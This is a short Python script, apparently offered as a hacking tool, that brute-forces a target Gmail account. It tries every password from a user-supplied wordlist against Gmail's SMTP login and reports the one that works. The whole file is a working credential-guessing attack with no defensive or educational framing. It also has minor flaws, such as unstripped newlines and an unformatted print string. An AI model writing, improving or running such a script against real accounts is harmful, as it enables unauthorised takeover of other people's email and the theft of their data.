import smtplib

#smtpServer
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

#Target Email & Password File
user = input("Enter The Target Gmail Address : ")
passfile = input ("Enter Password File Location : ")
passfile = open (passfile, "r")

for password in passfile :
		try : 
				smtpserver.login(user, password)
				print("+++ Password found  : %s ", password ) 
				break;
		except smtplib.SMTPAuthenticationError:
				print ("-- Password is incorrect : %s ", password) 